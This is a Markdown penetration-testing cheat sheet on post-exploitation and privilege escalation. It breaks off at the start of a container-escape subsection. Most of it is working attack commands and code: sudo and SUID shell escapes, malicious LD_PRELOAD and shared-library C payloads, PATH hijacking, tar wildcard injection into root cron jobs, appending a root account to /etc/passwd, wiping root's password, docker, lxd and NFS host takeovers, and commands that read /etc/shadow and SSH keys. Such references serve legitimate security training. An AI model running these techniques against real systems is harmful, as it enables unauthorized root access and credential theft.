# Post Exploitation & Privilege Escalation

## üéØ Goal

Turn a low-privilege shell or user access into **root/SYSTEM** and extract useful information and credentials for lateral movement.

---

## Table of Contents

1. [Immediate Context Gathering](#1-immediate-context-gathering)
2. [Linux Automated Enumeration](#2-linux-automated-enumeration)
3. [Linux Manual Privilege Escalation](#3-linux-manual-privilege-escalation)
4. [Windows Automated Enumeration](#4-windows-automated-enumeration)
5. [Windows Manual Privilege Escalation](#5-windows-manual-privilege-escalation)
6. [Credential Harvesting](#6-credential-harvesting)
7. [Persistence Mechanisms](#7-persistence-mechanisms)

---

## üìã Phase Checklist

### Immediate Context Gathering

- [ ] Confirm identity/session context ‚Üí [1.1](#11-linux-identity-and-system-information), [1.2](#12-windows-identity-and-system-information)
- [ ] Collect OS/host details ‚Üí [1.1](#11-linux-identity-and-system-information), [1.2](#12-windows-identity-and-system-information)
- [ ] Document host network posture ‚Üí [1.3](#13-linux-network-enumeration), [1.4](#14-windows-network-enumeration)
- [ ] Enumerate running processes and services ‚Üí [1.5](#15-linux-process-and-service-enumeration), [1.6](#16-windows-process-and-service-enumeration)
- [ ] Enumerate users and groups ‚Üí [1.7](#17-linux-user-and-group-enumeration), [1.8](#18-windows-user-and-group-enumeration)

### Linux Automated Enumeration 

- [ ] Run LinPEAS + review ‚Üí [2.1](#21-linpeas-linux-privilege-escalation-awesome-script)
- [ ] Run LSE + review ‚Üí [2.2](#22-linux-smart-enumeration-lse)
- [ ] Run LinEnum + review ‚Üí [2.3](#23-linenum)
- [ ] Analyze automated results ‚Üí [2.4](#24-analyzing-automated-results)

### Linux Manual Privilege Review 

#### Basic Configuration Review
- [ ] Review sudo boundaries ‚Üí [3.1](#31-sudo-misconfigurations)
- [ ] Check SUID/SGID exposures ‚Üí [3.2](#32-suidsgid-binaries)
- [ ] Review Linux capabilities ‚Üí [3.3](#33-linux-capabilities)
- [ ] Identify writable critical files ‚Üí [3.4](#34-writable-files--path-hijacking)
- [ ] Check PATH vulnerabilities ‚Üí [3.4](#34-writable-files--path-hijacking)

#### Scheduled Tasks & Services
- [ ] Review cron jobs & systemd timers ‚Üí [3.5](#35-cron-job-exploitation)

#### Authentication & Access
- [ ] Check /etc/passwd and /etc/shadow permissions ‚Üí [3.6](#36-writable-etcpasswd-or-etcshadow)
- [ ] Review group memberships ‚Üí [3.7](#37-interesting-group-memberships)
- [ ] Check NFS exports ‚Üí [3.8](#38-nfs-misconfiguration)

#### Advanced Techniques
- [ ] Identify container environment ‚Üí [3.9](#39-container-escape)
- [ ] Assess kernel vulnerabilities ‚Üí [3.10](#310-kernel-exploits)

### Windows Automated Enumeration 

- [ ] Run WinPEAS + review ‚Üí [4.1](#41-winpeas-windows-privilege-escalation-awesome-script)
- [ ] Run PowerUP + review ‚Üí [4.2](#42-powerup)
- [ ] Run Seatbelt + review ‚Üí [4.3](#43-seatbelt)
- [ ] Analyze automated results ‚Üí [4.4](#44-analyzing-automated-results)

### Windows Manual Privilege Review

#### Basic Configuration Review
- [ ] Review token privileges ‚Üí [5.1](#51-windows-token-privileges)
- [ ] Check AlwaysInstallElevated policy ‚Üí [5.4](#54-alwaysinstallelevated)
- [ ] Review autorun registry keys ‚Üí [5.5](#55-registry-exploitation)
- [ ] Identify writable directories ‚Üí [5.6](#56-file-and-directory-permissions)

#### Services & Scheduled Tasks
- [ ] Check service misconfigurations ‚Üí [5.2](#52-service-exploitation)
- [ ] Review scheduled tasks ‚Üí [5.3](#53-scheduled-tasks)

#### Advanced Techniques
- [ ] Identify DLL hijacking opportunities ‚Üí [5.7](#57-dll-hijacking)

### Credential Harvesting Checklist

- [ ] Review shell/history artifacts ‚Üí [6.1](#61-history-files)
- [ ] Hunt for "password" in file contents ‚Üí [6.2](#62-file-system--configuration-hunting)
- [ ] List interesting extensions (.kdbx, .rdp, .ovpn) ‚Üí [6.2](#62-file-system--configuration-hunting)
- [ ] Check Install/Unattend files ‚Üí [6.2](#62-file-system--configuration-hunting)
- [ ] Identify app/DB credentials ‚Üí [6.3](#63-database-credentials)
- [ ] Collect SSH key material ‚Üí [6.4](#64-ssh-keys)
- [ ] Assess browser credential exposure ‚Üí [6.5](#65-browser-credentials)
- [ ] Dump secrets (Mimikatz/SAM) ‚Üí [6.6](#66-credential-dumping-mimikatz--more)
- [ ] Extract WiFi credentials ‚Üí [6.7](#67-wifi--network-credentials)
- [ ] Check cloud provider configs ‚Üí [6.8](#68-additional-sources)

### Persistence

- [ ] Linux Persistence ‚Üí [7.1](#71-linux-persistence)
- [ ] Windows Persistence ‚Üí [7.2](#72-windows-persistence)

---

## Quick Reference Commands

### Linux Quick Wins

```bash
# One-liner enumeration
whoami; id; hostname; uname -a; ip a; sudo -l

# Quick SUID search
find / -perm -4000 2>/dev/null | grep -v snap

# Quick capability check
getcap -r / 2>/dev/null

# Quick writable files
find / -writable -type f 2>/dev/null | grep -v proc | head -20

# Quick credential search
grep -r "password" /var/www /home 2>/dev/null | grep -v Binary | head -10
```

### Windows Quick Wins

```cmd
# One-liner enumeration
whoami /all & hostname & systeminfo | findstr /B /C:"OS Name" /C:"OS Version"

# Quick privilege check
whoami /priv | findstr "SeImpersonate\|SeAssignPrimaryToken\|SeBackup\|SeRestore"

# Quick service check
wmic service get name,pathname | findstr /i /v "C:\Windows\\" | findstr /i /v """

# Quick scheduled task check
schtasks /query /fo LIST /v | findstr /i "exe\|bat\|ps1"

# Quick credential search
findstr /si password C:\*.txt C:\*.xml C:\*.ini C:\*.config 2>nul
```

---
## 1 Immediate Context Gathering

### 1.1 Linux Identity and System Information

**üë§ User Identity**

```bash
# Show the current user name
whoami

# Display detailed UID, GID and group information
id

# List all groups the current user belongs to
groups

# Show the login name of the user associated with this session
who am i

# Look up the current user in /etc/passwd
cat /etc/passwd | grep "$(whoami)"

# Show group memberships for the current user explicitly
groups "$(whoami)"

# Dump all environment variables
env

# Show the current PATH value
echo "$PATH"

# Show the current HOME directory value
echo "$HOME"

# Show the current USER variable (if set)
echo "$USER"

# List sudo privileges for the current user
sudo -l

# List sudo privileges in verbose mode
sudo -ll

# Check that the current user has an interactive shell assigned
cat /etc/passwd | grep "$(whoami)" | grep -v nologin
```

**üíª System Information**

```bash
# Show the system hostname
hostname

# Display detailed hostname and OS information (if available)
hostnamectl 2>/dev/null

# Show full kernel and OS info
uname -a

# Show only the kernel release version
uname -r

# Read the kernel version string from /proc
cat /proc/version

# Display a brief OS identification banner
cat /etc/issue

# Show distribution release files (if present)
cat /etc/*-release 2>/dev/null

# Use lsb_release for distribution details (if installed)
lsb_release -a 2>/dev/null

# Print the machine architecture using arch
arch

# Print the machine hardware name using uname
uname -m

# Extract architecture information from lscpu output
lscpu | grep "Architecture"

# Show whether the system is 32-bit or 64-bit
getconf LONG_BIT

# Show OS release information (if available)
cat /etc/os-release 2>/dev/null

# Show LSB release information (if available)
cat /etc/lsb-release 2>/dev/null

# Detect whether the system is virtualized
systemd-detect-virt 2>/dev/null

# Show system manufacturer via DMI (if accessible)
dmidecode -s system-manufacturer 2>/dev/null
```

**‚è∞ System Time & Timezone**

```bash
# Show current system date and time
date

# Display detailed time and timezone information (if available)
timedatectl 2>/dev/null

# Show the configured timezone file (if present)
cat /etc/timezone 2>/dev/null

# Show system uptime and load averages
uptime
```

### 1.2 Windows Identity and System Information

**üë§ User Identity**

```cmd
# Show the current user name
whoami

# Display detailed user information including SID and group memberships
whoami /all

# Show user privileges
whoami /priv

# Show group memberships
whoami /groups

# Display current user's SID
whoami /user

# Show environment variables
set

# Show specific environment variable PATH
echo %PATH%

# Show specific environment variable USERPROFILE
echo %USERPROFILE%

# Show specific environment variable USERNAME
echo %USERNAME%
```

```powershell
# PowerShell: Get current user information
[System.Security.Principal.WindowsIdentity]::GetCurrent()

# PowerShell: Show environment variables
Get-ChildItem Env:

# PowerShell: Show specific environment variable
$env:PATH
$env:USERPROFILE
$env:USERNAME
```

**üíª System Information**

```cmd
# Show system information summary
systeminfo

# Show hostname
hostname

# Show OS version
ver

# Show detailed Windows version information
wmic os get caption,version,buildnumber,osarchitecture

# Show computer system information
wmic computersystem get name,domain,manufacturer,model,username

# Show BIOS information
wmic bios get serialnumber,version

# Show installed hotfixes/patches
wmic qfe list

# Show system architecture
echo %PROCESSOR_ARCHITECTURE%

# Check if system is 64-bit
if exist "%ProgramFiles(x86)%" (echo 64-bit) else (echo 32-bit)
```

```powershell
# PowerShell: Comprehensive system information
Get-ComputerInfo

# PowerShell: OS information
Get-CimInstance Win32_OperatingSystem

# PowerShell: Computer system information
Get-CimInstance Win32_ComputerSystem

# PowerShell: BIOS information
Get-CimInstance Win32_BIOS

# PowerShell: Installed hotfixes
Get-HotFix

# PowerShell: Architecture
[Environment]::Is64BitOperatingSystem
```

**‚è∞ System Time & Timezone**

```cmd
# Show current date and time
date /t
time /t

# Show detailed time and timezone information
systeminfo | findstr /C:"Time Zone"

# Show system uptime via systeminfo
systeminfo | findstr /C:"System Boot Time"
```

```powershell
# PowerShell: Show current date and time
Get-Date

# PowerShell: Show timezone
Get-TimeZone

# PowerShell: Show last boot time
(Get-CimInstance Win32_OperatingSystem).LastBootUpTime

# PowerShell: Calculate uptime
(Get-Date) - (Get-CimInstance Win32_OperatingSystem).LastBootUpTime
```

### 1.3 Linux Network Enumeration

```bash
# Show all network interfaces and IP addresses using ip
ip a

# Show interfaces and IP addresses using ifconfig (if installed)
ifconfig 2>/dev/null

# Display IP addresses for all interfaces
ip addr show

# Show link-layer information for all interfaces
ip link show

# Show the kernel routing table via ip
ip route

# Explicitly show routing information (same as ip route)
ip route show

# Display the routing table with route -n
route -n

# Show the routing table with netstat
netstat -rn

# Dump the ARP neighbor table with ip
ip neigh

# Show ARP cache entries (if arp is available)
arp -a 2>/dev/null

# List listening sockets and associated processes
ss -tulpn

# List all TCP connections with numeric addresses
ss -antp

# Show listening sockets with netstat (if available)
netstat -tulpn 2>/dev/null

# Show all TCP connections with netstat (if available)
netstat -antp 2>/dev/null

# Show DNS resolver configuration
cat /etc/resolv.conf

# Show static host mappings
cat /etc/hosts

# List basic iptables firewall rules (numeric)
iptables -L -n 2>/dev/null

# List iptables rules with counters and verbose output
iptables -L -n -v 2>/dev/null
```

### 1.4 Windows Network Enumeration

```cmd
# Show IP configuration for all adapters
ipconfig /all

# Show routing table
route print

# Show ARP cache
arp -a

# Show active connections and listening ports
netstat -ano

# Show listening ports only
netstat -an | findstr LISTENING

# Show DNS cache
ipconfig /displaydns

# Show hosts file
type C:\Windows\System32\drivers\etc\hosts

# Show firewall state
netsh advfirewall show allprofiles

# Show firewall rules
netsh advfirewall firewall show rule name=all

# Show network shares
net share

# Show network connections/sessions
net use

# Show network statistics
netstat -s
```

```powershell
# PowerShell: Show network adapter configuration
Get-NetIPConfiguration

# PowerShell: Show all IP addresses
Get-NetIPAddress

# PowerShell: Show routing table
Get-NetRoute

# PowerShell: Show ARP cache
Get-NetNeighbor

# PowerShell: Show active TCP connections
Get-NetTCPConnection

# PowerShell: Show listening TCP ports
Get-NetTCPConnection -State Listen

# PowerShell: Show UDP endpoints
Get-NetUDPEndpoint

# PowerShell: Show DNS client cache
Get-DnsClientCache

# PowerShell: Show firewall profile
Get-NetFirewallProfile

# PowerShell: Show firewall rules
Get-NetFirewallRule

# PowerShell: Show network shares
Get-SmbShare

# PowerShell: Show SMB connections
Get-SmbConnection
```

### 1.5 Linux Process and Service Enumeration

```bash
# List all running processes with ps aux
ps aux

# List all running processes with ps -ef
ps -ef

# List processes with wide output (no truncation)
ps auxww

# Show processes with specific columns: user, pid, ppid, and command
ps -eo user,pid,ppid,cmd

# Display a process tree with PIDs
pstree -p

# Display process tree-style output using ps
ps auxf

# List running systemd services (if systemd is present)
systemctl list-units --type=service --state=running 2>/dev/null

# Show legacy SysV-style service status summary (if available)
service --status-all 2>/dev/null

# List services managed by chkconfig (on older systems)
chkconfig --list 2>/dev/null

# Show listening TCP/UDP sockets and associated processes
ss -tulpn

# List open network sockets and owning processes via lsof
lsof -i -P -n 2>/dev/null

# Monitor processes/cron-like activity without root (pspy64)
# (Place pspy64 on target, chmod +x, then run)
./pspy64 -pf -i 1000 2>/dev/null
```

### 1.6 Windows Process and Service Enumeration

```cmd
# List all running processes
tasklist

# List processes with verbose details
tasklist /v

# List processes with services
tasklist /svc

# Show running services
sc query type= service state= all

# Show only running services
sc query type= service state= active

# List services using net command
net start

# Show detailed service information
sc qc <SERVICE_NAME>

# Show service configuration
sc queryex <SERVICE_NAME>

# List processes with WMIC
wmic process list brief

# List processes with full details
wmic process list full

# List services with WMIC
wmic service list brief

# Show only running services with WMIC
wmic service where started=true get name,state,pathname
```

```powershell
# PowerShell: List all processes
Get-Process

# PowerShell: List processes with details
Get-Process | Select-Object ProcessName,Id,Path,Company

# PowerShell: Show process owners
Get-WmiObject Win32_Process | Select-Object ProcessId,Name,@{l="Owner";e={$_.GetOwner().User}}

# PowerShell: List all services
Get-Service

# PowerShell: List running services
Get-Service | Where-Object {$_.Status -eq "Running"}

# PowerShell: Show service details
Get-Service | Select-Object Name,DisplayName,Status,StartType

# PowerShell: Show services with executable paths
Get-WmiObject Win32_Service | Select-Object Name,State,PathName

# PowerShell: Show network connections with processes
Get-NetTCPConnection | Select-Object LocalAddress,LocalPort,RemoteAddress,RemotePort,State,OwningProcess,@{l="ProcessName";e={(Get-Process -Id $_.OwningProcess).Name}}
```

### 1.7 Linux User and Group Enumeration

```bash
# Dump all user entries from /etc/passwd
cat /etc/passwd

# List just the usernames from /etc/passwd
cat /etc/passwd | cut -d: -f1

# Enumerate users using getent (respects NSS)
getent passwd

# Show only users with a login shell
cat /etc/passwd | grep -v nologin | grep -v false

# Display currently logged-in users with system load
w

# Show who is currently logged in
who

# Show detailed login information (including dead processes)
who -a

# Show recent login history
last

# Show last login for all users (if available)
lastlog 2>/dev/null

# List all groups from /etc/group
cat /etc/group

# Enumerate groups using getent
getent group

# Highlight potentially privileged groups
cat /etc/group | grep -E "sudo|wheel|admin|root"

# Iterate through users and print group memberships for each
for user in $(cat /etc/passwd | cut -d: -f1); do groups "$user"; done

# List the last five entries in /etc/passwd (often newest accounts)
sort -nk3 -t: /etc/passwd | tail -n 5
```

### 1.8 Windows User and Group Enumeration

```cmd
# List local users
net user

# Show detailed user information
net user [username]

# List domain users (if domain-joined)
net user /domain

# Show detailed domain user information
net user [username] /domain

# List local groups
net localgroup

# Show members of a specific local group
net localgroup [groupname]

# List domain groups
net group /domain

# Show members of a domain group
net group [groupname] /domain

# Show currently logged-in users
query user

# Show active sessions
qwinsta

# List user accounts with WMIC
wmic useraccount list brief

# List local groups with WMIC
wmic group list brief
```

```powershell
# PowerShell: List local users
Get-LocalUser

# PowerShell: Show detailed local user information
Get-LocalUser | Select-Object Name,Enabled,LastLogon,PasswordLastSet

# PowerShell: List local groups
Get-LocalGroup

# PowerShell: Show members of a local group
Get-LocalGroupMember -Group "Administrators"

# PowerShell: List domain users (if domain-joined)
Get-ADUser -Filter * -Properties * 2>$null

# PowerShell: List domain groups
Get-ADGroup -Filter * 2>$null

# PowerShell: Show members of domain group
Get-ADGroupMember -Identity "Domain Admins" 2>$null

# PowerShell: Show currently logged-on users
Get-WmiObject Win32_ComputerSystem | Select-Object UserName

# PowerShell: Show user sessions
Get-CimInstance Win32_LogonSession | Get-CimAssociatedInstance -Association Win32_LoggedOnUser

# PowerShell: Show user profile paths
Get-WmiObject Win32_UserProfile | Select-Object LocalPath,SID,LastUseTime
```
---

## 2 Linux Automated Enumeration

### 2.1 LinPEAS (Linux Privilege Escalation Awesome Script)

**üöÄ Download & Execute**

```bash
# Download directly from GitHub
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh

# Download and save
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh | tee linpeas_output.txt

# Quick mode (skip time-consuming checks)
./linpeas.sh -a | tee linpeas_quick.txt

# Specific checks only
./linpeas.sh -s  # Superfast mode
./linpeas.sh -P  # Password checks only

# With colors in file
./linpeas.sh -a 2>&1 | tee linpeas_output.txt

# Transfer via base64 (if no download capability)
# On attacker:
base64 -w0 linpeas.sh
# On target:
echo "<BASE64_STRING>" | base64 -d > linpeas.sh
chmod +x linpeas.sh
```

**Important Notes:**

- **DO NOT** use the automatic exploitation feature during exams
- Focus on manual verification of findings
- LinPEAS output can be overwhelming - prioritize red/yellow findings
- Always save output for later analysis

### 2.2 Linux Smart Enumeration (LSE)

```bash
# Download
wget https://github.com/diego-treitos/linux-smart-enumeration/raw/master/lse.sh
chmod +x lse.sh

# Level 0 (basic)
./lse.sh -l0 | tee lse_l0.txt

# Level 1 (interesting findings)
./lse.sh -l1 | tee lse_l1.txt

# Level 2 (detailed)
./lse.sh -l2 | tee lse_l2.txt

# Specific checks
./lse.sh -c  # Check for specific CVEs
```

### 2.3 LinEnum

```bash
# Download
wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
chmod +x LinEnum.sh

# Execute with thorough mode
./LinEnum.sh -t | tee linenum_output.txt

# Keyword search
./LinEnum.sh -k password | tee linenum_passwords.txt

# Export findings
./LinEnum.sh -e export_linenum.txt
```

### 2.4 Analyzing Automated Results

**Priority Order:**

1. **CRITICAL** (Red) - Immediate privilege escalation vectors
    - Writable /etc/passwd or /etc/shadow
    - Sudo NOPASSWD entries
    - SUID binaries in unusual locations
2. **HIGH** (Yellow/Orange) - Likely privilege escalation
    - Interesting SUID binaries
    - Writable cron jobs
    - Readable sensitive files
3. **MEDIUM** - Potential vectors requiring more investigation
    - Kernel exploit suggestions
    - Interesting capabilities
    - NFS exports

**Quick Grep for Critical Findings:**

```bash
# Search output for critical keywords
grep -i "password" linpeas_output.txt
grep -i "root" linpeas_output.txt
grep -i "NOPASSWD" linpeas_output.txt
grep -i "Writable" linpeas_output.txt
grep -E "SUID|SGID" linpeas_output.txt
```

---

## 3 Linux Manual Privilege Escalation

|Technique|Idea|Check (example)|
|---|---|---|
|Sudo misconfigurations|Abuse allowed sudo commands for root|`sudo -l`|
|SUID/SGID binaries|Find privileged binaries that keep owner rights|`find / -perm -4000 -type f 2>/dev/null`|
|Linux capabilities|Capabilities grant elevated actions without full SUID|`getcap -r / 2>/dev/null`|
|Writable files/PATH|Modify root-executed scripts or hijack PATH|`find / -writable -type f 2>/dev/null | head`|
|Cron job exploitation|Writable cron scripts or wildcard tar usage|`cat /etc/crontab; cat /etc/cron.d/* 2>/dev/null`|
|Writable passwd/shadow|Directly alter auth files if writable|`ls -la /etc/passwd /etc/shadow`|
|Group memberships|Privileged groups grant special access|`id; groups`|
|NFS misconfiguration|no_root_squash allows root via share|`showmount -e <TARGET_IP>`|
|Container escape|Detect container or privileged setup|`ls -la /.dockerenv; cat /proc/1/cgroup`|
|Kernel exploits|Outdated kernel vulnerable to LPE|`uname -a`|

### 3.1 Sudo Misconfigurations
**Concept:** Abuse overly permissive sudo rules to execute commands as root without password.

**Check sudo permissions:**
```bash
sudo -l                    # List allowed commands
sudo -ll                   # Verbose output
sudo -V | head -n1         # Check version for CVEs
```

**Common exploitable patterns:**
```bash
# Direct root access
(ALL) NOPASSWD: ALL        ‚Üí sudo su

# Shell binaries
NOPASSWD: /bin/bash        ‚Üí sudo /bin/bash
NOPASSWD: /bin/sh          ‚Üí sudo /bin/sh

# Text editors (escape to shell)
NOPASSWD: /usr/bin/vim     ‚Üí sudo vim -c ':!/bin/sh'
NOPASSWD: /usr/bin/nano    ‚Üí sudo nano, then ^R^X, then reset; sh 1>&0 2>&0

# Interpreters
NOPASSWD: /usr/bin/python* ‚Üí sudo python -c 'import os; os.system("/bin/sh")'
NOPASSWD: /usr/bin/perl    ‚Üí sudo perl -e 'exec "/bin/sh";'
NOPASSWD: /usr/bin/ruby    ‚Üí sudo ruby -e 'exec "/bin/sh"'

# Common utilities
NOPASSWD: /usr/bin/find    ‚Üí sudo find /etc -exec /bin/sh \;
NOPASSWD: /usr/bin/awk     ‚Üí sudo awk 'BEGIN {system("/bin/sh")}'
NOPASSWD: /usr/bin/less    ‚Üí sudo less /etc/hosts, then !sh
NOPASSWD: /usr/bin/more    ‚Üí sudo more /etc/hosts, then !sh
```

**LD_PRELOAD exploitation:**
```bash
# Check if env_keep includes LD_PRELOAD
sudo -l | grep LD_PRELOAD

# Create malicious library
cat > /tmp/shell.c << 'EOF'
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init() {
    unsetenv("LD_PRELOAD");
    setuid(0);
    setgid(0);
    system("/bin/bash -p");
}
EOF

gcc -fPIC -shared -o /tmp/shell.so /tmp/shell.c -nostartfiles
sudo LD_PRELOAD=/tmp/shell.so <any_sudo_command>
```

**CVE-2019-14287 (Sudo < 1.8.28):**
```bash
# If sudo rule shows (ALL, !root), bypass with:
sudo -u#-1 /bin/bash
```

**Reference:** Always check [GTFOBins](https://gtfobins.github.io/) for binary-specific techniques.

---

### 3.2 SUID/SGID Binaries
**Concept:** Binaries with SUID bit run with owner's privileges. If misconfigured or exploitable, they grant root access.

**Find SUID/SGID binaries:**
```bash
find / -perm -4000 -type f 2>/dev/null              # SUID files
find / -perm -2000 -type f 2>/dev/null              # SGID files
find / -type f -perm -6000 2>/dev/null              # Both SUID and SGID
find / -perm -4000 -user root -type f 2>/dev/null   # SUID owned by root
```

**Exploitable SUID binaries:**
```bash
# Shell with SUID (preserves privileges with -p)
/bin/bash -p
/bin/sh -p

# Interpreters with SUID
python -c 'import os; os.setuid(0); os.system("/bin/bash -p")'
perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/bash -p";'
ruby -e 'Process::Sys.setuid(0); exec "/bin/bash -p"'

# Utilities
find /etc -exec /bin/sh -p \;
vim -c ':py import os; os.execl("/bin/sh", "sh", "-pc", "reset; exec sh -p")'
less /etc/hosts, then !/bin/sh -p
awk 'BEGIN {system("/bin/bash -p")}'
```

**Analyze custom SUID binaries:**
```bash
strings /path/to/suid_binary | less           # Look for commands/paths
ltrace /path/to/suid_binary 2>&1              # Trace library calls
strace /path/to/suid_binary 2>&1              # Trace system calls

# Check for relative path execution (PATH hijacking opportunity)
strings /path/to/suid_binary | grep -v "^/"
```

**PATH hijacking for SUID:**
```bash
# If SUID binary calls command without absolute path (e.g., "service")
echo '#!/bin/bash' > /tmp/service
echo 'chmod +s /bin/bash' >> /tmp/service
chmod +x /tmp/service
export PATH=/tmp:$PATH
/path/to/suid_binary
/bin/bash -p
```

---

### 3.3 Linux Capabilities
**Concept:** Fine-grained privileges assigned to binaries without full SUID. Certain capabilities allow privilege escalation.

**Enumerate capabilities:**
```bash
getcap -r / 2>/dev/null
/sbin/getcap -r / 2>/dev/null
```

**Exploitable capabilities:**
```bash
# cap_setuid = Set UID to 0 (root)
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/bash";'
php -r "posix_setuid(0); system('/bin/bash');"
ruby -e 'Process::Sys.setuid(0); exec "/bin/bash"'

# cap_dac_read_search = Bypass file read permissions
tar -cvf /tmp/shadow.tar /etc/shadow
tar -xvf /tmp/shadow.tar -O

# cap_sys_admin = Mount filesystems, namespace manipulation
# (See container escape section)
```

---

### 3.4 Writable Files & PATH Hijacking
**Concept:** Writable critical files or scripts executed by root can be modified to escalate privileges.

**Find writable files/directories:**
```bash
find / -writable -type f 2>/dev/null | grep -v "/proc/" | grep -v "/sys/"
find / -writable -type d 2>/dev/null
find / -perm -2 -type f 2>/dev/null                    # World-writable files
find / -user $(whoami) -writable 2>/dev/null           # User-owned writable

# Check critical files
ls -la /etc/passwd /etc/shadow /etc/sudoers /etc/crontab
```

**Exploit writable scripts:**
```bash
# If script is executed by root (via cron, service, etc.)
echo 'chmod +s /bin/bash' >> /path/to/writable_script.sh
# Wait for execution
/bin/bash -p
```

**Check writable directories in PATH:**
```bash
echo $PATH
for dir in $(echo $PATH | tr ':' ' '); do ls -ld "$dir" 2>/dev/null | grep -w "w"; done
```

**Library hijacking (LD_LIBRARY_PATH):**
```bash
ldd /path/to/binary                           # Check library dependencies

# Create malicious library
cat > /tmp/evil.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>
static void inject() __attribute__((constructor));
void inject() {
    setuid(0); setgid(0);
    system("/bin/bash -p");
}
EOF

gcc -shared -fPIC -o /tmp/evil.so /tmp/evil.c
LD_LIBRARY_PATH=/tmp /path/to/vulnerable_binary
```

---

### 3.5 Cron Job Exploitation
**Concept:** Scheduled tasks running as root with writable components can be exploited.

**Enumerate cron jobs:**
```bash
cat /etc/crontab
ls -la /etc/cron.* /etc/cron.*/*
cat /etc/cron.d/* 2>/dev/null
crontab -l
ls -la /var/spool/cron/crontabs/
grep CRON /var/log/syslog 2>/dev/null
systemctl list-timers --all                   # Modern alternative (systemd timers)
```

**Monitor cron execution in real-time:**
```bash
# Using pspy (no root required)
wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64
chmod +x pspy64
./pspy64

# Or manual monitoring
while true; do ps aux | grep -v grep; sleep 1; done
```

**Exploitation vectors:**

**1. Writable cron script:**
```bash
# Find scripts referenced in crontab
cat /etc/crontab | grep -v "^#" | awk '{print $7}'

# If writable, inject payload
echo 'chmod +s /bin/bash' >> /path/to/script.sh
# Wait for cron execution
/bin/bash -p
```

**2. Wildcard injection (tar/rsync in cron):**
```bash
# If cron runs: tar czf /backup.tar.gz *
cd /target/directory

echo '#!/bin/bash' > shell.sh
echo 'chmod +s /bin/bash' >> shell.sh
chmod +x shell.sh

touch -- '--checkpoint=1'
touch -- '--checkpoint-action=exec=sh shell.sh'
# Wait for cron execution
```

**Example: tar -zxf /tmp/backup.tar.gz * (checkpoint action):**
Use this when a **root cron job** runs `tar` with a **wildcard** in a **writable directory**; `tar` will parse files that look like options, letting you trigger a command. This is commonly flagged by `./lse.sh` when it reports writable cron paths and prints the cron line.
```bash
# Cron line discovered by ./lse.sh (or /etc/cron.d/*):
# */2 * * * * root cd /opt/admin && tar -zxf /tmp/backup.tar.gz *

# Move into the cron working directory (must be writable by you)
cd /opt/admin

# Payload: grant SUID to /bin/bash for root persistence
echo 'chmod u+s /bin/bash' > test.sh

# Create files that tar interprets as CLI options
echo "" > "--checkpoint-action=exec=sh test.sh"
echo "" > --checkpoint=1

# Wait for the cron run, then escalate:
/bin/bash -p
id
```

**3. PATH hijacking in cron:**
```bash
# If cron uses relative paths
# Check PATH in /etc/crontab
grep PATH /etc/crontab

# Create malicious binary in writable PATH directory
echo '#!/bin/bash' > /writable/path/command
echo 'chmod +s /bin/bash' >> /writable/path/command
chmod +x /writable/path/command
```

---

### 3.6 Writable /etc/passwd or /etc/shadow
**Concept:** Direct modification of authentication files to add/modify privileged accounts.

**Check permissions:**
```bash
ls -la /etc/passwd /etc/shadow
```

**Exploit writable /etc/passwd:**
```bash
# Generate password hash
openssl passwd -1 -salt salt password123
# Output: $1$salt$qVR7HRO59TLcCKGLXyXQZ.

# Add new root user
echo 'newroot:$1$salt$qVR7HRO59TLcCKGLXyXQZ.:0:0:root:/root:/bin/bash' >> /etc/passwd
su newroot

# OR remove root password
sed -i 's/^root:[^:]*:/root::/' /etc/passwd
su root  # No password required
```

**Exploit writable /etc/shadow:**
```bash
# Generate password hash
mkpasswd -m sha-512 password123

# Replace root's hash in /etc/shadow
# OR remove password
sed -i 's/^root:[^:]*:/root::/' /etc/shadow
su root
```

---

### 3.7 Interesting Group Memberships
**Concept:** Membership in privileged groups grants access to sensitive resources or capabilities.

**Check group memberships:**
```bash
id
groups
cat /etc/group | grep $(whoami)
```

**Exploitable groups:**

**docker group:**
```bash
docker run -v /:/hostfs -it ubuntu chroot /hostfs bash
```

**lxd group:**
```bash
lxc init ubuntu:18.04 privesc -c security.privileged=true
lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
lxc start privesc
lxc exec privesc /bin/bash
cd /mnt/root
```

**disk group:**
```bash
# Direct disk access
debugfs /dev/sda1
debugfs: cat /etc/shadow
debugfs: cat /root/.ssh/id_rsa

# Or mount directly
mkdir /tmp/mnt
mount /dev/sda1 /tmp/mnt
cat /tmp/mnt/etc/shadow
```

**shadow group:**
```bash
cat /etc/shadow
# Crack passwords offline with john or hashcat
```

**adm group:**
```bash
# Read sensitive logs
cat /var/log/* | grep -i password
```

**video group:**
```bash
# Access framebuffer/screen capture
cat /dev/fb0 > /tmp/screen.raw
```

---

### 3.8 NFS Misconfiguration
**Concept:** NFS exports with `no_root_squash` allow remote root operations on shared directories.

**Check NFS exports:**
```bash
cat /etc/exports
showmount -e localhost
showmount -e <TARGET_IP>
mount | grep nfs
```

**Exploit no_root_squash:**
```bash
# On attacker machine (as root):
mkdir /tmp/nfs
mount -t nfs <TARGET_IP>:/share /tmp/nfs

# Create SUID binary
cat > /tmp/nfs/shell.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
int main(void) {
    setuid(0); setgid(0);
    system("/bin/bash -p");
}
EOF

gcc /tmp/nfs/shell.c -o /tmp/nfs/shell
chmod +s /tmp/nfs/shell

# On target (as low-priv user):
cd /share
./shell
```

---

### 3.9 Container Escape
**Concept:** Break out of containerized environments to access the host system.

**Detect container environment:**
```bash
ls -la /.dockerenv
cat /proc/1/cgroup | grep -i docker
systemd-detect-virt
cat /proc/1/status | grep CapEff
```

**Privileged container escape:**
```bash
# Mount host filesystem
mkdir /mnt/host
mount /dev/sda1 /mnt/host
chroot /mnt/host bash
```

**Docker socket exposure:**
```bash
ls -la /var/run/docker.sock

# If accessible, create privileged container
docker run -v /:/hostfs -it ubuntu chroot /hostfs bash
```

**cap_sys_admin escape:**
```bash
